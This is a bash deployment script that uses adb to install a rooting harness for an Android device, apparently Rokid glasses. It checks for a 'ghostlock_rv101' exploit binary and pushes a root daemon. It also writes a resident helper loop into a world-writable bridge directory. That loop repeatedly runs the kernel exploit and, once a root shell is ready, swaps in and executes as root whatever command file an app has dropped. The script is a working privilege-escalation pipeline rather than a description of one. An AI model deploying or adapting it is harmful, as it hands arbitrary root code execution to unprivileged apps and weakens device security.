#!/usr/bin/env bash
source "$(dirname "$0")/env.sh"   # shared ADB/SERIAL (see deploy/env.sh)
set -u

# ===================== adjust to your environment =====================
SERIAL="${SERIAL:?請設定 SERIAL 或讓 env.sh 自動偵測}"
BIN="/data/local/tmp/ghostlock_rv101"
BRIDGE="/data/local/tmp/ghostlock_bridge"
HELPER="/data/local/tmp/ghostlock_bridge_helper.sh"
# ==========================================================

adb_s() { "$ADB" -s "$SERIAL" "$@"; }

# Safe process killing + mailbox cleanup (see proc_util.sh for the measured notes on why
# `pkill -f` cannot be used). In particular HELPER_PAT must end at `helpe` to cover both the
# App and desktop-tool helper variants: the old `ghostlock_bridge_helper.sh` was measured to
# **miss** the `_desktop` variant.
source "$(dirname "$0")/proc_util.sh"
# Lease-file writability must be guaranteed by the shell side: the App has no directory
# write permission on /data/local/tmp and cannot create the lease file itself (measured
# Permission denied). This makes sure it exists with mode 666.
source "$(dirname "$0")/lease.sh"
lease_ensure_file

echo "[1/4] 檢查 ghostlock_rv101"
if adb_s shell "[ -x $BIN ]" 2>/dev/null; then
  echo "  [+] ghostlock_rv101 就緒"
else
  echo "  [!] $BIN 不存在/不可執行，請先 push ghostlock_rv101"
  echo "      adb push <ghostlock_rv101> $BIN && adb shell chmod 755 $BIN"
  exit 1
fi

echo "[2/4] 建立 bridge 目錄並放寬權限（App 可讀寫，但仍碰不到 exploit）"
adb_s shell "mkdir -p $BRIDGE && chmod 777 $BRIDGE" || exit 1

echo "[2.5/4] 推送 root daemon（若已建置）"
DAEMON_LOCAL="/home/kali/rokid_root/deploy/root_daemon"
if [ -f "$DAEMON_LOCAL" ]; then
  adb_s push "$DAEMON_LOCAL" /data/local/tmp/root_daemon >/dev/null 2>&1
  adb_s shell "chmod 755 /data/local/tmp/root_daemon"
  echo "  [+] root_daemon 已推送"
else
  echo "  [!] 未找到 root_daemon（先跑 deploy/build_root_daemon.sh 建置）"
fi

echo "[3/4] 寫入 helper 常駐迴圈"
adb_s shell "cat > $HELPER" <<'HELPER_EOF'
#!/system/bin/sh
BRIDGE=/data/local/tmp/ghostlock_bridge
BIN=/data/local/tmp/ghostlock_rv101
ROOT=/data/local/tmp/.ghostlock_root.sh
RUNLOG=/data/local/tmp/gl_run.log
ENV="GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1"
MARK="__GHOSTLOCK_PAYLOAD_DONE__"
CMD="$BRIDGE/last.cmd"
STAGE="$BRIDGE/payload.staging"
OUT="$BRIDGE/last.out"
DONE="$BRIDGE/last.done"
PROG="$BRIDGE/last.progress"
MAX_TRY=3
# Heartbeat: the App side cannot see other processes with ps (Android restriction), so the
# helper writes a timestamp every second and the App reads the file to decide whether the
# trigger pipeline is resident.
HEARTBEAT="$BRIDGE/helper.alive"
PIDFILE="$BRIDGE/helper.pid"
echo $$ > "$PIDFILE" 2>/dev/null; chmod 666 "$PIDFILE" 2>/dev/null

while true; do
  date +%s > "$HEARTBEAT" 2>/dev/null; chmod 666 "$HEARTBEAT" 2>/dev/null
  if [ -f "$CMD" ]; then
    rm -f "$OUT" "$DONE" "$STAGE"
    echo "started" > "$PROG"; chmod 666 "$PROG"
    cp "$CMD" "$STAGE"
    ok=0; err="unknown"
    t=0
    while [ $t -lt $MAX_TRY ]; do
      t=$((t+1))
      echo "exploit-attempt-$t" > "$PROG"
      rm -f "$ROOT" "$RUNLOG"
      sh -c "$ENV $BIN > $RUNLOG 2>&1" &
      # wait for ready: early in startup the exploit writes the default .ghostlock_root.sh
      ready=0; i=0
      while [ $i -lt 120 ]; do
        if grep -q "dropping to root shell" "$ROOT" 2>/dev/null; then ready=1; break; fi
        if grep -q "FOPS install failed" "$RUNLOG" 2>/dev/null; then break; fi
        i=$((i+1)); sleep 1
      done
      if [ "$ready" != "1" ]; then
        err="ready-timeout-or-FOPS-failed"
        pkill -9 -f ghostlock_rv101 2>/dev/null
        continue
      fi
      echo "ready" > "$PROG"
      # swap in the payload (cp keeps last.cmd for retries)
      cp "$STAGE" "$ROOT" && chmod 755 "$ROOT"
      echo "installed" > "$PROG"
      # wait for done: the payload (root) has echoed DONE
      echo "waiting-done" > "$PROG"
      dd=0; i=0
      while [ $i -lt 200 ]; do
        if grep -q "$MARK" "$DONE" 2>/dev/null; then dd=1; break; fi
        if grep -q "FOPS install failed" "$RUNLOG" 2>/dev/null; then err="exploit-FOPS-failed"; break; fi
        i=$((i+1)); sleep 1
      done
      if [ "$dd" = "1" ]; then ok=1; break; fi
      err="done-timeout"
      pkill -9 -f ghostlock_rv101 2>/dev/null
    done
    if [ "$ok" = "1" ]; then echo "OK" > "$OUT"; echo "done" > "$PROG"; else echo "ERR:$err" > "$OUT"; echo "failed-$err" > "$PROG"; fi
    chmod 666 "$OUT" "$PROG"
    pkill -9 -f ghostlock_rv101 2>/dev/null
    rm -f "$CMD" "$STAGE"
  fi
  sleep 1
done
HELPER_EOF
adb_s shell "chmod 755 $HELPER" || exit 1

echo "[4/4] 啟動 helper（背景常駐，先清舊實例）"

# (a) Safely kill the old helper of **both variants**.
#     The old `pkill -f ghostlock_bridge_helper.sh` was measured to **miss** the `_desktop`
#     variant (the pattern requires ".sh" right after "helper", but that variant is
#     "_desktop.sh"), so the desktop helper survived the whole run and fought this helper
#     over the shared files.
kill_all_helpers

# (b) Clear the trigger files left in the mailbox — **this must happen before starting the
#     helper**. After a device reboot the helper is restarted, and a leftover last.cmd makes
#     it run the exploit again at once (measured: 994 child processes, load 75.8, adb
#     commands timing out).
clear_trigger_mailboxes

sleep 1
adb_s shell "setsid sh $HELPER > /data/local/tmp/ghostlock_bridge_helper.log 2>&1 < /dev/null &"
sleep 2
adb_s shell "ps -A -o PID,ARGS 2>/dev/null | grep ghostlock_bridge_helpe | grep -v grep"

echo ""
echo "完成。眼鏡 App 會自動偵測 helper 心跳（ghostlock_bridge/helper.alive）並使用 bridge 引擎，無需重建 APK。"
echo "helper log: /data/local/tmp/ghostlock_bridge_helper.log"
